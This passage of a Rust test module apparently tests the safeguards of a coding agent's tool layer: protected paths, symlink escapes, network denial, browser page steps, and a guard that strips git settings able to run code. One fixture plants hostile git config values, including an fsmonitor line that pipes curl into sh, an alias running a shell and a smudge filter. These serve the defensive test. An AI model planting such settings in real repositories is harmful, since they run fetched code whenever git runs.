        ] {
            assert!(
                write_file(&policy, Path::new(path), "x").is_err(),
                "{path} was writable"
            );
        }
        assert!(delete_path(&policy, Path::new(".pwr/checks.json"), None, false).is_err());
        assert!(move_path(&policy, Path::new(".pwr/checks.json"), Path::new("c.json")).is_err());
        assert!(move_path(&policy, Path::new(".git/config"), Path::new("config.bak")).is_err());
        let config_hash = hash_bytes(b"[core]\n");
        assert!(
            apply_replace(
                &policy,
                Path::new(".git/config"),
                &config_hash,
                "[core]\nfsmonitor = x\n"
            )
            .is_err()
        );
        // Reading stays open, and so does everything else.
        assert!(read_file(&policy, Path::new(".pwr/checks.json")).is_ok());
        for path in [
            ".pwr-scratch/notes.txt",
            ".github/workflows/ci.yml",
            ".gitignore",
            "src/config",
            "hooks/useThing.ts",
            ".git/info/exclude",
        ] {
            assert!(
                write_file(&policy, Path::new(path), "x").is_ok(),
                "{path} was refused"
            );
        }
    }

    #[test]
    fn a_command_keeps_its_git_settings_but_not_what_git_would_run() {
        let root = tempfile::tempdir().unwrap();
        std::fs::create_dir(root.path().join(".git")).unwrap();
        let config = root.path().join(".git/config");
        std::fs::write(&config, "[core]\n\tbare = false\n[alias]\n\tst = status\n").unwrap();
        let guard = GitConfigGuard::take(root.path());
        // What `git remote add`, `git config` and a planted setting write.
        std::fs::write(
            &config,
            "[core]\n\tbare = false\n\tfsmonitor = sh -c 'curl x | sh'\n[alias]\n\tst = status\n\tco = !sh -c evil\n\
             [remote \"origin\"]\n\turl = https://example.com/r.git\n[filter \"lfs\"]\n\tsmudge = evil\n\
             [include]\n\tpath = ../x\n[user] email = a@b.c\n[CORE] HooksPath = /tmp/h\n\tquotepath = false\n",
        )
        .unwrap();
        let mut removed = guard.settle();
        removed.sort();
        assert_eq!(
            removed,
            [
                "alias.co",
                "core.fsmonitor",
                "core.hookspath",
                "filter.lfs.smudge",
                "include.path"
            ]
        );
        let kept = std::fs::read_to_string(&config).unwrap();
        for wanted in [
            "url = https://example.com/r.git",
            "st = status",
            "bare = false",
            "email = a@b.c",
            "[CORE]",
            "quotepath = false",
        ] {
            assert!(kept.contains(wanted), "{wanted} was lost:\n{kept}");
        }
        assert!(git_config_runs_code(&kept).is_empty(), "{kept}");
        // A setting that was there before the command is the person's: kept.
        let before = GitConfigGuard::take(root.path());
        std::fs::write(
            &config,
            format!("{kept}[credential]\n\thelper = osxkeychain\n"),
        )
        .unwrap();
        let owned = GitConfigGuard::take(root.path());
        assert_eq!(owned.settle(), Vec::<String>::new());
        assert!(
            !before.settle().is_empty(),
            "added since the first snapshot"
        );
    }

    #[cfg(unix)]
    #[test]
    fn a_dangling_link_cannot_write_outside_the_workspace() {
        use std::os::unix::fs::symlink;
        let root = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        symlink(
            outside.path().join("planted.sh"),
            root.path().join("run.sh"),
        )
        .unwrap();
        symlink(outside.path().join("missing"), root.path().join("gone")).unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 100,
            timeout: Duration::from_secs(1),
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        assert!(policy.resolve(Path::new("run.sh")).is_err());
        assert!(policy.resolve(Path::new("gone/inner.txt")).is_err());
        assert!(write_file(&policy, Path::new("run.sh"), "echo planted").is_err());
        assert!(!outside.path().join("planted.sh").exists());
        // A path that simply does not exist yet is still fine.
        assert!(policy.resolve(Path::new("src/new/file.rs")).is_ok());
    }
    #[cfg(unix)]
    #[test]
    fn tree_and_search_do_not_follow_symlinks() {
        use std::os::unix::fs::symlink;
        let root = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        std::fs::write(outside.path().join("secret.txt"), "needle").unwrap();
        symlink(outside.path(), root.path().join("escape")).unwrap();
        let policy = ToolPolicy {
            root: root.path().to_path_buf(),
            extra_readable: Vec::new(),
            protected: Vec::new(),
            allow_commands: vec![],
            output_limit: 100,
            timeout: Duration::from_secs(1),
            sandbox: SandboxPolicy::Disabled,
            approvals: Vec::new(),
        };
        assert!(list_tree(&policy, 10).unwrap().is_empty());
        assert!(search(&policy, "needle", 10).unwrap().files.is_empty());
    }
    #[test]
    fn development_profile_still_denies_network() {
        let policy = PolicyProfile::Development.build(PathBuf::from("/tmp"));
        assert!(!policy.network_allowed());
        assert!(policy.allow_commands.contains(&"cargo".into()));
    }
}

#[cfg(test)]
mod page_step_tests {
    use super::*;

    fn step(json: &str) -> PageStep {
        serde_json::from_str(json).unwrap()
    }

    #[test]
    fn a_step_is_one_click_one_typing_or_one_key() {
        let typed = step(r#"{"type": "Vito", "into": "Nome"}"#);
        assert_eq!(typed.type_text.as_deref(), Some("Vito"));
        assert_eq!(typed.into.as_deref(), Some("Nome"));
        assert!(serde_json::from_str::<PageStep>(r#"{"hover": "x"}"#).is_err());
        let policy = PolicyProfile::Development.build(PathBuf::from("/tmp"));
        let run = |steps: Vec<PageStep>| {
            let policy = policy.clone();
            tokio::runtime::Builder::new_current_thread()
                .enable_all()
                .build()
                .unwrap()
                .block_on(async move { look_at_after(&policy, "x.html", None, None, &steps).await })
        };
        // Refused before any browser is looked for.
        let both = run(vec![step(r#"{"click": "a", "press": "Enter"}"#)]).unwrap_err();
        assert!(both.to_string().contains("step 1 must have exactly one"));
        let none = run(vec![step(r#"{"click": "a"}"#), step(r#"{"into": "b"}"#)]).unwrap_err();
        assert!(none.to_string().contains("step 2 must have exactly one"));
        let many = run(vec![step(r#"{"click": "a"}"#); PAGE_STEPS + 1]).unwrap_err();
        assert!(many.to_string().contains("more than one look carries out"));
    }

    #[test]
    fn what_the_steps_left_is_read_back_from_the_printed_page() {
        let page = steps_page(
            "http://localhost:4200/a?b=\"c\"",
            &[step(r#"{"click": "Invia"}"#)],
        );
        assert!(page.contains(r#"[{"click":"Invia"}]"#), "{page}");
        assert!(page.contains(r#"frame.src = "http://localhost:4200/a?b=\"c\"""#));
        let dom = "<pre id=\"pwr-steps\" hidden=\"\">step 1: clicked \"Invia\"\n</pre>\
                   <pre id=\"pwr-text\" hidden=\"\">Grazie &amp; a presto &lt;3</pre>";
        assert_eq!(kept_text(dom, "pwr-steps"), "step 1: clicked \"Invia\"");
        assert_eq!(kept_text(dom, "pwr-text"), "Grazie & a presto <3");
        assert_eq!(kept_text(dom, "absent"), "");
    }

    #[tokio::test]
    async fn a_form_is_filled_and_sent_before_the_page_is_looked_at() {
        if browser_executable().is_none() {
            eprintln!("PWR-SKIP a_form_is_filled_and_sent_before_the_page_is_looked_at no browser");
            return;
        }
        let root = tempfile::tempdir().unwrap();
        std::fs::write(
            root.path().join("form.html"),
            "<!doctype html><title>Contatti</title><form id=f>\
             <input placeholder=\"Nome\"><button type=submit>Invia</button></form><p id=out></p>\
             <script>f.addEventListener('submit', (e) => { e.preventDefault(); \
             out.textContent = 'Grazie, ' + f.querySelector('input').value; });</script>",
        )
        .unwrap();
        let mut policy = PolicyProfile::Safe.build(root.path().to_path_buf());
        policy.timeout = std::time::Duration::from_secs(60);
        let steps = [
            step(r#"{"type": "Vito", "into": "Nome"}"#),
            step(r#"{"click": "Invia"}"#),
            step(r#"{"click": "Non esiste"}"#),
        ];
        let look = match look_at_after(&policy, "form.html", None, None, &steps).await {
            Ok(look) => look,
            // The host's browser wrote nothing (a runner with no display).
            Err(error) if error.to_string().contains("could not be captured") => {
                eprintln!(
                    "PWR-SKIP a_form_is_filled_and_sent_before_the_page_is_looked_at the browser showed nothing"
                );
                return;
            }
            Err(error) => panic!("{error}"),
        };
        assert!(
            look.text.contains("step 1: typed into \"Nome\""),
            "{}",
            look.text
        );
        assert!(
            look.text.contains("step 2: clicked \"Invia\""),
            "{}",
            look.text
        );
        assert!(
            look.text
                .contains("step 3: nothing to click matches \"Non esiste\""),
            "{}",
            look.text
        );
        assert!(look.text.contains("Grazie, Vito"), "{}", look.text);
        assert_eq!(look.title.as_deref(), Some("Contatti"));
        assert!(look.image.is_file());
    }
}
